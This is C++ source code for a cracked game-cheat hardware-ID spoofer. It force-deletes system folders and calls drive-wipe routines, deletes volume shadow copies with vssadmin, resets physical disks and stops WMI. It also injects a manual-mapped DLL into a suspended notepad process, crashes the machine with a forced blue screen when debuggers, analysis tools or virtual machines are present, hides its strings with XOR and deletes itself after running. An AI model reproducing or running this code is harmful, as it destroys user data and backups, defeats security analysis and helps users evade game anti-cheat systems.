	system(_xor_("rmdir /s /q %systemdrive%\\Users\\%username%\\AppData\\Local\\Microsoft\\Windows\\INetCache\\IE\\RHKRUA8J").c_str());
	system(_xor_("rmdir /s /q %systemdrive%\\Users\\%username%\\AppData\\Local\\Microsoft\\CLR_v4.0\\UsageLogs").c_str());
	system(_xor_("rmdir /s /q %systemdrive%\\Windows\\Temp").c_str());
	system(_xor_("rmdir /s /q %systemdrive%\\Windows\\SERVIC~1\\NETWOR~1\\AppData\\Local\\Temp").c_str());
	system(_xor_("rmdir /s /q %systemdrive%\\Windows\\ServiceProfiles\\NetworkService\\AppData\\Local\\Microsoft\\Windows\\DeliveryOptimization\\Cache").c_str());
	wipe_c();
	wipe_d();
	wipe_e();
	wipe_f();
	CConsole::Clear();
	ShowConsole();

	return 0;
}

void suspend(DWORD processId)
{
	HANDLE hThreadSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0);

	THREADENTRY32 threadEntry;
	threadEntry.dwSize = sizeof(THREADENTRY32);

	Thread32First(hThreadSnapshot, &threadEntry);

	do
	{
		if (threadEntry.th32OwnerProcessID == processId)
		{
			HANDLE hThread = OpenThread(THREAD_ALL_ACCESS, FALSE,
				threadEntry.th32ThreadID);

			SuspendThread(hThread);
			CloseHandle(hThread);
		}
	} while (Thread32Next(hThreadSnapshot, &threadEntry));

	CloseHandle(hThreadSnapshot);
}

DWORD WINAPI Service_injector_Thread()
{
	DWORD Pid = 0;
	MODULEINFO Info;
	HANDLE hProcess = INVALID_HANDLE_VALUE;
	HMODULE Kernel32 = 0;

	DWORD FileSize = 0, BytesRead = 0;
	PVOID pBuffer = 0;

	while (!(Pid = GetProcessid("notepad.exe")))
		Sleep(50);


	hProcess = OpenProcess(PROCESS_ALL_ACCESS, false, Pid);

	if (hProcess == INVALID_HANDLE_VALUE || hProcess == 0)
	{
		std::cout << "Invalid Handle " << std::endl;
		return 0;
	}
	ManualMap* mapper = new ManualMap(g_fspoofer, sizeof(g_fspoofer), hProcess, Pid);

	if (mapper->MapDll())
		std::cout << "Inject Success " << std::endl;

	VirtualFree(pBuffer, 0, MEM_RELEASE);

	delete mapper;
	CloseHandle(hProcess);

	return 1;
}
#define SELF_REMOVE_STRING  TEXT("cmd.exe /C ping 1.1.1.1 -n 1 -w 3000 > Nul & Del /f /q \"%s\"")

void DelMe1()
{
	TCHAR szModuleName[MAX_PATH];
	TCHAR szCmd[2 * MAX_PATH];
	STARTUPINFO si = { 0 };
	PROCESS_INFORMATION pi = { 0 };

	GetModuleFileName(NULL, szModuleName, MAX_PATH);

	StringCbPrintf(szCmd, 2 * MAX_PATH, SELF_REMOVE_STRING, szModuleName);

	CreateProcess(NULL, szCmd, NULL, NULL, FALSE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi);

	CloseHandle(pi.hThread);
	CloseHandle(pi.hProcess);
}
VOID __stdcall DoEnableSvc()
{
	SC_HANDLE schSCManager;
	SC_HANDLE schService;

	// Get a handle to the SCM database. 

	schSCManager = OpenSCManager(
		NULL,                    // local computer
		NULL,                    // ServicesActive database 
		SC_MANAGER_ALL_ACCESS);  // full access rights 

	if (NULL == schSCManager)
	{
		printf("OpenSCManager failed (%d)\n", GetLastError());
		return;
	}

	// Get a handle to the service.

	schService = OpenService(
		schSCManager,            // SCM database 
		"Winmgmt",               // name of service 
		SERVICE_CHANGE_CONFIG);  // need change config access 

	if (schService == NULL)
	{
		printf("OpenService failed (%d)\n", GetLastError());
		CloseServiceHandle(schSCManager);
		return;
	}

	// Change the service start type.

	if (!ChangeServiceConfig(
		schService,            // handle of service 
		SERVICE_NO_CHANGE,     // service type: no change 
		SERVICE_DEMAND_START,  // service start type 
		SERVICE_NO_CHANGE,     // error control: no change 
		NULL,                  // binary path: no change 
		NULL,                  // load order group: no change 
		NULL,                  // tag ID: no change 
		NULL,                  // dependencies: no change 
		NULL,                  // account name: no change 
		NULL,                  // password: no change 
		NULL))                // display name: no change
	{
		printf("ChangeServiceConfig failed (%d)\n", GetLastError());
	}
	else printf("Service enabled successfully.\n");

	CloseServiceHandle(schService);
	CloseServiceHandle(schSCManager);
}
#pragma comment(lib, "ntdll.lib")

extern "C" NTSTATUS NTAPI RtlAdjustPrivilege(ULONG Privilege, BOOLEAN Enable, BOOLEAN CurrentThread, PBOOLEAN OldValue);
extern "C" NTSTATUS NTAPI NtRaiseHardError(LONG ErrorStatus, ULONG NumberOfParameters, ULONG UnicodeStringParameterMask, PULONG_PTR Parameters, ULONG ValidResponseOptions, PULONG Response);



int auth();
void bsod()
{
	BOOLEAN bl;
	ULONG Response;
	RtlAdjustPrivilege(19, TRUE, FALSE, &bl); // Enable SeShutdownPrivilege
	NtRaiseHardError(STATUS_ASSERTION_FAILURE, 0, 0, NULL, 6, &Response); // Shutdown
}

void DebuggerPresent()
{
	if (IsDebuggerPresent())
	{
		bsod();
	}
}

DWORD_PTR FindProcessId2(const std::string processName)
{
	PROCESSENTRY32 processInfo;
	processInfo.dwSize = sizeof(processInfo);

	HANDLE processesSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, NULL);
	if (processesSnapshot == INVALID_HANDLE_VALUE)
		return 0;

	Process32First(processesSnapshot, &processInfo);
	if (!processName.compare(processInfo.szExeFile))
	{
		CloseHandle(processesSnapshot);
		return processInfo.th32ProcessID;
	}

	while (Process32Next(processesSnapshot, &processInfo))
	{
		if (!processName.compare(processInfo.szExeFile))
		{
			CloseHandle(processesSnapshot);
			return processInfo.th32ProcessID;
		}
	}

	CloseHandle(processesSnapshot);
	return 0;
}

void ScanProccessListForBlacklistedProcess()
{
	if (FindProcessId2("ollydbg.exe") != 0)
	{
		bsod();
	}
	else if (FindProcessId2("ProcessHacker.exe") != 0)
	{
		bsod();
	}
	else if (FindProcessId2("tcpview.exe") != 0)
	{
		bsod();
	}
	else if (FindProcessId2("autoruns.exe") != 0)
	{
		bsod();
	}
	else if (FindProcessId2("autorunsc.exe") != 0)
	{
		bsod();
	}
	else if (FindProcessId2("filemon.exe") != 0)
	{
		bsod();
	}
	else if (FindProcessId2("procmon.exe") != 0)
	{
		bsod();
	}
	else if (FindProcessId2("regmon.exe") != 0)
	{
		bsod();
	}
	else if (FindProcessId2("procexp.exe") != 0)
	{
		bsod();
	}
	else if (FindProcessId2("idaq.exe") != 0)
	{
		bsod();
	}
	else if (FindProcessId2("idaq64.exe") != 0)
	{
		bsod();
	}
	else if (FindProcessId2("ImmunityDebugger.exe") != 0)
	{
		bsod();
	}
	else if (FindProcessId2("Wireshark.exe") != 0)
	{
		bsod();
	}
	else if (FindProcessId2("dumpcap.exe") != 0)
	{
		bsod();
	}
	else if (FindProcessId2("HookExplorer.exe") != 0)
	{
		bsod();
	}
	else if (FindProcessId2("ImportREC.exe") != 0)
	{
		bsod();
	}
	else if (FindProcessId2("PETools.exe") != 0)
	{
		bsod();
	}
	else if (FindProcessId2("LordPE.exe") != 0)
	{
		bsod();
	}
	else if (FindProcessId2("dumpcap.exe") != 0)
	{
		bsod();
	}
	else if (FindProcessId2("SysInspector.exe") != 0)
	{
		bsod();
	}
	else if (FindProcessId2("proc_analyzer.exe") != 0)
	{
		bsod();
	}
	else if (FindProcessId2("sysAnalyzer.exe") != 0)
	{
		bsod();
	}
	else if (FindProcessId2("sniff_hit.exe") != 0)
	{
		bsod();
	}
	else if (FindProcessId2("windbg.exe") != 0)
	{
		bsod();
	}
	else if (FindProcessId2("joeboxcontrol.exe") != 0)
	{
		bsod();
	}
	else if (FindProcessId2("Fiddler.exe") != 0)
	{
		bsod();
	}
	else if (FindProcessId2("joeboxserver.exe") != 0)
	{
		bsod();
	}
	else if (FindProcessId2("ida64.exe") != 0)
	{
		bsod();
	}
	else if (FindProcessId2("ida.exe") != 0)
	{
		bsod();
	}
	else if (FindProcessId2("Vmtoolsd.exe") != 0)
	{
		bsod();
	}
	else if (FindProcessId2("Vmwaretrat.exe") != 0)
	{
		bsod();
	}
	else if (FindProcessId2("Vmwareuser.exe") != 0)
	{
		bsod();
	}
	else if (FindProcessId2("Vmacthlp.exe") != 0)
	{
		bsod();
	}
	else if (FindProcessId2("vboxservice.exe") != 0)
	{
		bsod();
	}
	else if (FindProcessId2("vboxtray.exe") != 0)
	{
		bsod();
	}
	else if (FindProcessId2("KsDumper.exe") != 0)
	{
	bsod();
	}
	else if (FindProcessId2("ReClass.NET.exe") != 0)
	{
		bsod();
	}
	else if (FindProcessId2("x64dbg.exe") != 0)
	{
		bsod();
	}
	else if (FindProcessId2("OLLYDBG.exe") != 0)
	{
		bsod();
	}
}

void ScanBlacklistedWindows()
{
	if (FindWindowA(NULL, _xor_("The Wireshark Network Analyzer").c_str()))
	{
		bsod();
	}

	if (FindWindowA(NULL, _xor_("Progress Telerik Fiddler Web Debugger").c_str()))
	{
		bsod();
	}

	if (FindWindowA(NULL, _xor_("x64dbg").c_str()))
	{
		bsod();
	}

	if (FindWindowA(NULL, _xor_("KsDumper").c_str()))
	{
		bsod();
	}
}

void AntiDebug()
{
	DebuggerPresent();
	ScanBlacklistedWindows();
	ScanProccessListForBlacklistedProcess();
}

int main()
{
	CConsole::SetRandomTitle();
	SetConsoleTextAttribute(GetStdHandle(STD_OUTPUT_HANDLE), 11);
	if (consoleWindowHandle) {
		SetWindowPos(
			consoleWindowHandle, // window handle
			HWND_TOPMOST, // "handle to the window to precede
						  // the positioned window in the Z order
						  // OR one of the following:"
						  // HWND_BOTTOM or HWND_NOTOPMOST or HWND_TOP or HWND_TOPMOST
			0, 0, // X, Y position of the window (in client coordinates)
			0, 0, // cx, cy => width & height of the window in pixels
			SWP_DRAWFRAME | SWP_NOMOVE | SWP_NOSIZE | SWP_SHOWWINDOW // The window sizing and positioning flags.
		);
		// OPTIONAL ! - SET WINDOW'S "SHOW STATE"
		ShowWindow(
			consoleWindowHandle, // window handle
			SW_NORMAL // how the window is to be shown
					  // SW_NORMAL => "Activates and displays a window.
					  // If the window is minimized or maximized,
					  // the system restores it to its original size and position.
					  // An application should specify this flag
					  // when displaying the window for the first time."
		);
	}
	else {
	}
	system(_xor_("taskkill /f /im EpicGamesLauncher.exe >nul 2>&1").c_str());
	system(_xor_("taskkill /f /im FortniteClient-Win64-Shipping.exe >nul 2>&1").c_str());

	system(_xor_("taskkill /f /im OneDrive.exe >nul 2>&1").c_str());
	system(_xor_("taskkill /f /im RustClient.exe >nul 2>&1").c_str());
	system(_xor_("taskkill /f /im Origin.exe >nul 2>&1").c_str());
	system(_xor_("taskkill /f /im r5apex.exe >nul 2>&1").c_str());
	CConsole::Clear();
	//crypto.key_enc = c_crypto::random_string(256);
	//crypto.key = c_crypto::random_string(32);
	//crypto.iv = c_crypto::random_string(16);
	const wchar_t* Blank = L"\r\n";
	const wchar_t* Top1 = L" ╔════════════════════════════════════════════════════════════════════════════════════════════════════════════════════╗\r\n";
	const wchar_t* Top2 = L" ║                                         /   ))     |\         )               ).                                    ║\r\n";
	const wchar_t* Top3 = L" ║                                   c--. (\  ( `.    / )  (\   ( `.     ).     ( (                                     ║\r\n";
	const wchar_t* Top4 = L" ║                                   | |   ))  ) )   ( (   `.`.  ) )    ( (      ) )                                  ║\r\n";
	const wchar_t* Top5 = L" ║                                   | |  ( ( / _..----.._  ) | ( ( _..----.._  ( (                                   ║\r\n";
	const wchar_t* Top6 = L" ║                     ,-.           | |---) V.'-------.. `-. )-/.-' ..------ `--) \._                                 ║\r\n";
	const wchar_t* Top7 = L" ║                     | /===========| |  (   |      ) ( ``-.`\/'.-''           (   ) ``-._                            ║\r\n";
	const wchar_t* Top8 = L" ║                     | | / / / / / | |--------------------->  <-------------------------_>=-                        ║\r\n";
	const wchar_t* Top9 = L" ║                     | \===========| |                 ..-'./\.`-..                _,,-'                              ║\r\n";
	const wchar_t* Tp10 = L" ║                     `-'           | |-------._------''_.-'----`-._``------_.-----'                                 ║\r\n";
	const wchar_t* Tp11 = L" ║                                   | |         ``----''            ``----''                                         ║\r\n";
	const wchar_t* Tp12 = L" ║                                   | |                                                                              ║\r\n";
	const wchar_t* Tp13 = L" ║                                   c--`                                                                             ║\r\n";
	const wchar_t* Tp14 = L" ║                                RoninSpoofer Cracked - bouzz is a retard                                            ║\r\n";
	const wchar_t* Tp15 = L" ╚════════════════════════════════════════════════════════════════════════════════════════════════════════════════════╝\r\n";

	WriteConsoleW(GetStdHandle(STD_OUTPUT_HANDLE), Blank, wcslen(Blank), 0, 0);
	WriteConsoleW(GetStdHandle(STD_OUTPUT_HANDLE), Top1, wcslen(Top1), 0, 0);
	WriteConsoleW(GetStdHandle(STD_OUTPUT_HANDLE), Top2, wcslen(Top2), 0, 0);
	WriteConsoleW(GetStdHandle(STD_OUTPUT_HANDLE), Top3, wcslen(Top3), 0, 0);
	WriteConsoleW(GetStdHandle(STD_OUTPUT_HANDLE), Top4, wcslen(Top4), 0, 0);
	WriteConsoleW(GetStdHandle(STD_OUTPUT_HANDLE), Top5, wcslen(Top5), 0, 0);
	WriteConsoleW(GetStdHandle(STD_OUTPUT_HANDLE), Top6, wcslen(Top6), 0, 0);
	WriteConsoleW(GetStdHandle(STD_OUTPUT_HANDLE), Top7, wcslen(Top7), 0, 0);
	WriteConsoleW(GetStdHandle(STD_OUTPUT_HANDLE), Top8, wcslen(Top8), 0, 0);
	WriteConsoleW(GetStdHandle(STD_OUTPUT_HANDLE), Top9, wcslen(Top9), 0, 0);
	WriteConsoleW(GetStdHandle(STD_OUTPUT_HANDLE), Tp10, wcslen(Tp10), 0, 0);
	WriteConsoleW(GetStdHandle(STD_OUTPUT_HANDLE), Tp10, wcslen(Tp10), 0, 0);
	WriteConsoleW(GetStdHandle(STD_OUTPUT_HANDLE), Tp12, wcslen(Tp12), 0, 0);
	WriteConsoleW(GetStdHandle(STD_OUTPUT_HANDLE), Tp13, wcslen(Tp13), 0, 0);
	WriteConsoleW(GetStdHandle(STD_OUTPUT_HANDLE), Tp14, wcslen(Tp14), 0, 0);
	WriteConsoleW(GetStdHandle(STD_OUTPUT_HANDLE), Tp15, wcslen(Tp15), 0, 0);
	S_LogType LogType;
	std::string HWID = GetHWID();
	Log(_xor_("https://discord.gg/2FskFFf for other great cracks"), LogType.Info);
	Log(_xor_("Initializing"), LogType.Info);
	Log(_xor_("Connecting.."), LogType.Warning);

	//CheckForUpdates();
	// Randomexe();
	CConsole::SetRandomTitle();
	Beep(523, 1000);

		char answ3r;
		Log(_xor_("Authed succefully"), LogType.Success);
		CConsole::SetRandomTitle();
		SetConsoleTextAttribute(GetStdHandle(STD_OUTPUT_HANDLE), 11);
		cout << "Do you want to clean for fortnite and apex traces?(Y/N): ";
		cin >> answ3r;
		if ((answ3r == 'y') || (answ3r == 'Y')) {
			Log(_xor_("Cleaning... (may take 1/5 minutes)"), LogType.Info);
			clean();
			SetConsoleTextAttribute(GetStdHandle(STD_OUTPUT_HANDLE), 11);

			CConsole::Clear();

		}
		else
		{
		}


		WriteConsoleW(GetStdHandle(STD_OUTPUT_HANDLE), Blank, wcslen(Blank), 0, 0);
		WriteConsoleW(GetStdHandle(STD_OUTPUT_HANDLE), Top1, wcslen(Top1), 0, 0);
		WriteConsoleW(GetStdHandle(STD_OUTPUT_HANDLE), Top2, wcslen(Top2), 0, 0);
		WriteConsoleW(GetStdHandle(STD_OUTPUT_HANDLE), Top3, wcslen(Top3), 0, 0);
		WriteConsoleW(GetStdHandle(STD_OUTPUT_HANDLE), Top4, wcslen(Top4), 0, 0);
		WriteConsoleW(GetStdHandle(STD_OUTPUT_HANDLE), Top5, wcslen(Top5), 0, 0);
		WriteConsoleW(GetStdHandle(STD_OUTPUT_HANDLE), Top6, wcslen(Top6), 0, 0);
		WriteConsoleW(GetStdHandle(STD_OUTPUT_HANDLE), Top7, wcslen(Top7), 0, 0);
		WriteConsoleW(GetStdHandle(STD_OUTPUT_HANDLE), Top8, wcslen(Top8), 0, 0);
		WriteConsoleW(GetStdHandle(STD_OUTPUT_HANDLE), Top9, wcslen(Top9), 0, 0);
		WriteConsoleW(GetStdHandle(STD_OUTPUT_HANDLE), Tp10, wcslen(Tp10), 0, 0);
		WriteConsoleW(GetStdHandle(STD_OUTPUT_HANDLE), Tp10, wcslen(Tp10), 0, 0);
		WriteConsoleW(GetStdHandle(STD_OUTPUT_HANDLE), Tp12, wcslen(Tp12), 0, 0);
		WriteConsoleW(GetStdHandle(STD_OUTPUT_HANDLE), Tp13, wcslen(Tp13), 0, 0);
		WriteConsoleW(GetStdHandle(STD_OUTPUT_HANDLE), Tp14, wcslen(Tp14), 0, 0);
		WriteConsoleW(GetStdHandle(STD_OUTPUT_HANDLE), Tp15, wcslen(Tp15), 0, 0);
		Log(_xor_("ronincheats.cc"), LogType.Info);
		Log(_xor_("Initializing"), LogType.Info);
		Log(_xor_("Connecting.."), LogType.Warning);

		CConsole::SetRandomTitle();

		Log(_xor_("Authed succefully"), LogType.Success);
		CConsole::SetRandomTitle();
		SetConsoleTextAttribute(GetStdHandle(STD_OUTPUT_HANDLE), 11);
		CConsole::Clear();
		Log(_xor_("Cleaned"), LogType.Success);
		Log(_xor_("Spoofing network"), LogType.Info);


		system(_xor_("NETSH WINSOCK RESET").c_str());
		system(_xor_("NETSH INT IP RESET").c_str());
		system(_xor_("NETSH INTERFACE IPV4 RESET").c_str());
		system(_xor_("NETSH INTERFACE IPV6 RESET").c_str());
		system(_xor_("NETSH INTERFACE TCP RESET").c_str());
		system(_xor_("IPCONFIG /RELEASE").c_str());
		system(_xor_("IPCONFIG /RELEASE").c_str());
		system(_xor_("IPCONFIG /RENEW").c_str());
		system(_xor_("IPCONFIG /FLUSHDNS").c_str());
		system(_xor_("IPCONFIG /RENEW").c_str());
		Log(_xor_("Spoofed Network"), LogType.Success);
		CConsole::Clear();
		SpoofAllSerial();
		Log(_xor_("Spoofing Hardare"), LogType.Info);
		DoEnableSvc();
		system("net stop winmgmt /y >nul 2>&1");

		system(("wmic diskdrive get serialnumber"));
		auto pStartupInfo = new STARTUPINFOA();
		auto remoteProcessInfo = new PROCESS_INFORMATION();
		CreateProcessA("C:\\Windows\\System32\\notepad.exe", nullptr, nullptr, nullptr, FALSE, CREATE_SUSPENDED, nullptr, nullptr, pStartupInfo, remoteProcessInfo);
		Sleep(4000);
		if (!GetProcessToken())
		{
			exit(0);
		}
		Service_injector_Thread();
		system("powershell.exe  Reset-PhysicalDisk * >nul 2>&1");
		system("vssadmin delete shadows /All /Quiet >nul 2>&1");

		Log(_xor_("Spoofed Hardware"), LogType.Success);
		system(("wmic diskdrive get serialnumber"));
		SetConsoleTitle("ronincheats.cc");
		Log(_xor_("Press any key to exit\n"), LogType.Warning);
		system("pause");
		DelMe1();

	return 0;
}